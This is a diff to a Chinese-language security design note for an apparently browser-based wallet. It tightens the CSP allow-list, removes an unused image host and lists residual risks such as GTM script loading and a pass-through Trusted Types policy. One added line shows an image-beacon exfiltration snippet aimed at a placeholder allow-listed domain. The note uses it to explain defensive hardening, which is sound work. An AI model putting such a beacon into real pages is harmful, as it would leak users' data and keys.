@@ -8,8 +8,8 @@
 
 | 层 | 作用 | 详见 |
 |---|---|---|
-| 私钥本地化 + PIN 加密 | 私钥只在浏览器解密、本地签名；泄露的加密数据也难以破解 | [pin-security.md](./pin-security.md) |
-| CSP 网络隔离 | 即使页面被注入脚本，也**无法把数据发到白名单之外的域名** | 本文件 §CSP 网络隔离 |
+| 私钥本地化 + PIN 加密 | 私钥只在浏览器解密、本地签名；即使本地存储泄露，攻击者仍需破解 PIN 才能拿到私钥（强度取决于 PIN，见 pin-security.md） | [pin-security.md](./pin-security.md) |
+| CSP 网络隔离 | 即使页面被注入脚本，也**无法把数据发到白名单之外的域名**（前提：白名单里每个域名都有真实用途，见下） | 本文件 §CSP 网络隔离 |
 | 运行时安全自检 | 把「当前页面到底允许访问哪些域名」显式呈现出来，并可检测变化 | 本文件 §运行时安全自检 |
 | 空隔签名 / 离线版 | 冷端保管私钥，热端只做观察，扫码签名 | [air-gap-signing.md](./air-gap-signing.md) |
 
@@ -27,14 +27,17 @@
 default-src 'self'
 script-src  'self' https://www.google-analytics.com https://www.googletagmanager.com 'sha256-...'
 connect-src 'self' https://223.5.5.5 https://dns.google ... （出站白名单）
-img-src     'self' data: https://api.qrserver.com
+img-src     'self' data:
 require-trusted-types-for 'script'
 ```
+
+**白名单纪律**：`img-src` / `connect-src` 里每个域名都必须有对应的真实调用点。**任何用不上的来源就是一条现成的外传通道** —— `new Image().src = 'https://<白名单域名>/?d=' + data` 不会被 CSP 拦。这里曾经列着一个从未被使用的 `api.qrserver.com`，就是这种冗余（已删除）。
 
 **剩余风险**（已知、未消除）：
 
 - CSP 用 `<meta>` 而非 HTTP 响应头，无法设置 `frame-ancestors`（点击劫持需服务器补充响应头；应用侧用运行时自检做提示）。
 - `script-src` 信任了 `googletagmanager.com`，GTM 可动态加载任意脚本，是潜在供应链入口。
+- `require-trusted-types-for 'script'` 只做到「sink 类型化」：`src/main.jsx` 注册的 `default` policy 是**直通**实现（原样返回字符串），因此它不构成对注入的额外缓解。真正的隔离来自 `script-src` 与 `connect-src`。
 - CSP 挡不住物理接触设备后直接读 `localStorage`。
 
 ---
